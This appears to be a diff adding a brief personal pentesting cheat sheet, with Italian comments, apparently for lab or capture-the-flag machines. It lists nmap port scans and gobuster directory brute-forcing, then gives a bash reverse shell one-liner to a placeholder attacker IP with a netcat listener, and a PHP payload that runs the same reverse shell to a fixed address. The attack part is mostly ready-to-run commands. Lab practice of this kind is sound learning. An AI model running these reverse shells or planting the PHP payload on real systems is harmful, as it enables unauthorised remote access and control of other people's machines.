@@ -1,0 +1,21 @@
+-- nmap
+
+nmap -sC -p- -Pn --min-rate 1000 10.129.124.162					//Host che appare offline (-Pn)
+nmap -sC -p- -sV --min-rate 1000 10.129.124.162					//Versione Servizi
+nmap -F 10.129.124.162								//Fast Scan
+
+
+-- gobuster
+
+gobuster dir --url http://10.129.57.240 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+gobuster dir --url http://10.129.57.240 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --threads 100	//Faster
+
+
+-- reverse shell (Linux)
+
+TARGET: bash -i >& /dev/tcp/<IP_attaccante>/4444 0>&1			ATTACKER: nc -lvnp 4444
+
+TARGET (php):
+<?php
+system("bash -c 'bash -i >& /dev/tcp/10.10.15.165/4444 0>&1'");
+?>
